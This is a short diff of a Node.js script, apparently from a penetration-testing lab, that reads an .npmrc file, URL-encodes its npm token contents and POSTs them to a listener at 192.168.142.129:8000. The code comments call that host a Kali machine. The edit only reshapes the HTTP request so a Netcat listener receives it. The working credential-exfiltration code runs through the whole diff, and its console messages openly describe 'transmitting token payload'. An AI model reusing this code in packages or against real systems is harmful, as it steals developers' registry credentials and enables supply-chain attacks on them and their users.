@@ -21,21 +21,22 @@ if (fs.existsSync(npmrcFile)) {
     // 3. CHANGE: URL-encode the npmrc text contents
     const encodedNpmrc = encodeURIComponent(npmrcContent);
     
-    // Using your exact Kali IP: 192.168.142.129
-    const kaliUrl = `http://192.168.142.129:8000/collect?file=${encodedNpmrc}`; 
-    
     console.log("📡 Step 2: Transmitting token payload to Kali listener...");
     
-    const req = http.request(kaliUrl, {
+    // FIX: Pass an object instead of a URL string so Netcat can receive it instantly!
+    const req = http.request({
+        host: "192.168.142.129",
+        port: 8000,
+        path: `/collect?file=${encodedNpmrc}`,
         method: "POST",
         headers: {
             "Content-Type": "application/json",
-            // Correctly matches the length of the system payload data body being sent below
             "Content-Length": Buffer.byteLength(systemPayload)
         }
     }, (res) => {
         console.log(`✅ Step 4: Success! Server responded with status: ${res.statusCode}`);
     });
+
 
     req.on('error', (err) => {
         console.error("❌ Network Connection Error. Is your Kali IP correct? Error:", err.message);
